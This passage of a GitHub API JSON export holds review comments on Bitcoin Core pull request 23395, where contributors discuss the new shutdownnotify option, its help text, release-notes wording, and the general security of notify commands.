      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Would it be better to add this to the end of all `-*notify`'s help option since this *note* applies to all of them?",
    "created_at": "2021-11-11T12:39:49Z",
    "updated_at": "2021-11-11T12:39:49Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747465714",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747465714"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747465714"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747465714/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 88,
    "original_line": 88,
    "side": "RIGHT",
    "in_reply_to_id": 747319588
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747479599",
    "pull_request_review_id": 803769859,
    "id": 747479599,
    "node_id": "PRRC_kwDOABII584sjaIv",
    "diff_hunk": "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
    "path": "src/init.cpp",
    "position": 9,
    "original_position": 9,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Do you mean we should restrict all shell commands to only interact with localhost (ie do not allow curl calls to any external hosts)? Apart from performing some sort of validation on the string provided for the option, I am unaware of any technique to enforce this. Do you have any suggestions? ",
    "created_at": "2021-11-11T13:00:50Z",
    "updated_at": "2021-11-11T13:00:50Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747479599",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747479599"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747479599"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747479599/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 163,
    "original_line": 163,
    "side": "RIGHT",
    "in_reply_to_id": 747321697
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492659",
    "pull_request_review_id": 803787391,
    "id": 747492659,
    "node_id": "PRRC_kwDOABII584sjdUz",
    "diff_hunk": "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
    "path": "src/init.cpp",
    "position": 9,
    "original_position": 9,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
    "user": {
      "login": "MarcoFalke",
      "id": 6399679,
      "node_id": "MDQ6VXNlcjYzOTk2Nzk=",
      "avatar_url": "https://avatars.githubusercontent.com/u/6399679?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/MarcoFalke",
      "html_url": "https://github.com/MarcoFalke",
      "followers_url": "https://api.github.com/users/MarcoFalke/followers",
      "following_url": "https://api.github.com/users/MarcoFalke/following{/other_user}",
      "gists_url": "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/MarcoFalke/subscriptions",
      "organizations_url": "https://api.github.com/users/MarcoFalke/orgs",
      "repos_url": "https://api.github.com/users/MarcoFalke/repos",
      "events_url": "https://api.github.com/users/MarcoFalke/events{/privacy}",
      "received_events_url": "https://api.github.com/users/MarcoFalke/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "As I mentioned earlier, this is unrelated to this pull and might be best discussed in another issue/pull for *all* notify commands. https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956356904",
    "created_at": "2021-11-11T13:19:57Z",
    "updated_at": "2021-11-11T13:19:57Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747492659",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "MEMBER",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492659"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747492659"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492659/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 163,
    "original_line": 163,
    "side": "RIGHT",
    "in_reply_to_id": 747321697
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492863",
    "pull_request_review_id": 803787635,
    "id": 747492863,
    "node_id": "PRRC_kwDOABII584sjdX_",
    "diff_hunk": "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
    "path": "doc/release-notes.md",
    "position": 6,
    "original_position": 6,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Maybe. Not sure. Or we can add in both places. I tried to share few alternatives but if none of them look good, we should at least document related security recommendations.",
    "created_at": "2021-11-11T13:20:12Z",
    "updated_at": "2021-11-11T13:20:13Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747492863",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492863"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747492863"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492863/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 88,
    "original_line": 88,
    "side": "RIGHT",
    "in_reply_to_id": 747319588
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494328",
    "pull_request_review_id": 803789540,
    "id": 747494328,
    "node_id": "PRRC_kwDOABII584sjdu4",
    "diff_hunk": "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
    "path": "src/init.cpp",
    "position": 9,
    "original_position": 9,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Yes because attackers can't do much if requests only work for localhost. I will ask in few subreddits and see if there are any ways to achieve this.",
    "created_at": "2021-11-11T13:22:14Z",
    "updated_at": "2021-11-11T13:22:14Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747494328",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494328"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747494328"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494328/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 163,
    "original_line": 163,
    "side": "RIGHT",
    "in_reply_to_id": 747321697
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494960",
    "pull_request_review_id": 803790300,
    "id": 747494960,
    "node_id": "PRRC_kwDOABII584sjd4w",
    "diff_hunk": "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
    "path": "doc/release-notes.md",
    "position": 6,
    "original_position": 6,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "user": {
      "login": "MarcoFalke",
      "id": 6399679,
      "node_id": "MDQ6VXNlcjYzOTk2Nzk=",
      "avatar_url": "https://avatars.githubusercontent.com/u/6399679?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/MarcoFalke",
      "html_url": "https://github.com/MarcoFalke",
      "followers_url": "https://api.github.com/users/MarcoFalke/followers",
      "following_url": "https://api.github.com/users/MarcoFalke/following{/other_user}",
      "gists_url": "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/MarcoFalke/subscriptions",
      "organizations_url": "https://api.github.com/users/MarcoFalke/orgs",
      "repos_url": "https://api.github.com/users/MarcoFalke/repos",
      "events_url": "https://api.github.com/users/MarcoFalke/events{/privacy}",
      "received_events_url": "https://api.github.com/users/MarcoFalke/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "The release notes are not the right place to put extended documentation in any case. The RPC docs, the manpage, or the docs folder are more appropriate. Also: https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956356904",
    "created_at": "2021-11-11T13:23:06Z",
    "updated_at": "2021-11-11T13:23:06Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747494960",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "MEMBER",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494960"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747494960"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494960/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 88,
    "original_line": 88,
    "side": "RIGHT",
    "in_reply_to_id": 747319588
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497080",
    "pull_request_review_id": 803793109,
    "id": 747497080,
    "node_id": "PRRC_kwDOABII584sjeZ4",
    "diff_hunk": "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
    "path": "src/init.cpp",
    "position": 9,
    "original_position": 9,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "It is related because if something was missed in other options previously we can try to make this secure and follow the same for others.\r\n\r\nAnd I have created an issue with all details.",
    "created_at": "2021-11-11T13:26:03Z",
    "updated_at": "2021-11-11T13:26:04Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747497080",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497080"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747497080"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497080/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 163,
    "original_line": 163,
    "side": "RIGHT",
    "in_reply_to_id": 747321697
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497238",
    "pull_request_review_id": 803793308,
    "id": 747497238,
    "node_id": "PRRC_kwDOABII584sjecW",
    "diff_hunk": "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
    "path": "src/init.cpp",
    "position": 9,
    "original_position": 9,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "@MarcoFalke agreed, will move the conversation to #23412 ",
    "created_at": "2021-11-11T13:26:16Z",
    "updated_at": "2021-11-11T13:26:17Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747497238",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497238"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747497238"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497238/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 163,
    "original_line": 163,
    "side": "RIGHT",
    "in_reply_to_id": 747321697
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747499702",
    "pull_request_review_id": 803796469,
    "id": 747499702,
    "node_id": "PRRC_kwDOABII584sjfC2",
    "diff_hunk": "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
    "path": "doc/release-notes.md",
    "position": 6,
    "original_position": 6,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "I don't mind documenting it in other places. I don't think sharing a security recommendation related to new config parameter will affect anything. It can only be helpful.\r\n\r\nI have created an issue for other details and alternatives to solve this problem. I think I can suggest changes in release notes which are part of this pull request.",
    "created_at": "2021-11-11T13:29:39Z",
    "updated_at": "2021-11-11T13:29:39Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747499702",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747499702"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747499702"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747499702/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 88,
    "original_line": 88,
    "side": "RIGHT",
    "in_reply_to_id": 747319588
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747503374",
    "pull_request_review_id": 803801266,
    "id": 747503374,
    "node_id": "PRRC_kwDOABII584sjf8O",
    "diff_hunk": "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
    "path": "doc/release-notes.md",
    "position": 6,
    "original_position": 6,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "user": {
      "login": "MarcoFalke",
      "id": 6399679,
      "node_id": "MDQ6VXNlcjYzOTk2Nzk=",
      "avatar_url": "https://avatars.githubusercontent.com/u/6399679?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/MarcoFalke",
      "html_url": "https://github.com/MarcoFalke",
      "followers_url": "https://api.github.com/users/MarcoFalke/followers",
      "following_url": "https://api.github.com/users/MarcoFalke/following{/other_user}",
      "gists_url": "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/MarcoFalke/subscriptions",
      "organizations_url": "https://api.github.com/users/MarcoFalke/orgs",
      "repos_url": "https://api.github.com/users/MarcoFalke/repos",
      "events_url": "https://api.github.com/users/MarcoFalke/events{/privacy}",
      "received_events_url": "https://api.github.com/users/MarcoFalke/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "> It can only be helpful.\r\n\r\nA new user downloading 29.0 won't read the release notes of 23.0 (a long EOL release at that time), so putting security documentation there won't be helpful. Also, it will bloat the release notes, making it distracting to read for users that are interested in changes. So I think wrong documentation or even right documentation in the wrong place *can* be harmful.",
    "created_at": "2021-11-11T13:34:43Z",
    "updated_at": "2021-11-11T13:34:44Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747503374",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "MEMBER",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747503374"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747503374"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747503374/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 88,
    "original_line": 88,
    "side": "RIGHT",
    "in_reply_to_id": 747319588
  }
]